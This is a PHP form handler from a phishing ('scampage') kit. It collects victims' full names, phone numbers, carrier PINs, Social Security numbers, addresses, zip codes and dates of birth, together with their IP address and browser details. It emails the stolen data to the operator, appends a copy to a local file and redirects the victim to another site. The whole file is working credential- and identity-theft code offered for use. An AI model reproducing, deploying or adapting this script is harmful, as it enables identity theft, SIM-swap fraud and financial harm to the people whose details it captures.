<?php 

$email = include '../email.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];		
$fullname = $_POST['fullname'];
$phone = $_POST['phone'];
$carrier = $_POST['carrierpin'];
$ssn = $_POST['ssn'];
$address = $_POST['street'];
$zip = $_POST['zip'];
$dob = $_POST['dob'];
		
$code = <<<EOT
= = = = = [ 🏦 YOUR SCAMPAGE FORMAT 🏦 ] = = = = = 

[FULL NAME] 		: {$fullname}
[PHONE NUMBER]		: {$phone}
[CARRIER PIN] 		: {$carrier}
[DATE OF BIRTH] 		: {$dob}
[SOCIAL SECURITY/ITIN] 		: {$ssn}
[STREET ADDRESS] 		: {$address}
[ZIPCODE] 		: {$zip}
	➖ ➖ ➖ 🌍 I P ~ A D D R E S S  🌍 ➖ ➖ ➖
IP		: {$ip}
IP lookup		: https://ip-api.com/$ip
OS		: {$useragent}

= = = = = [ 🏦 YOUR SCAMPAGE FORMAT 🏦 ] = = = = = 
\r\n\r\n
EOT;

$subject = "💢 RE$ULT ~ [{$ip}📍] 💢";
$headers = "From: YourName <anymail@gmail.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
mail($email,$subject,$code,$headers);
$save = fopen("../stored.txt","a+");
fwrite($save,$code);
fclose($save);
header("Location: website.com");


?>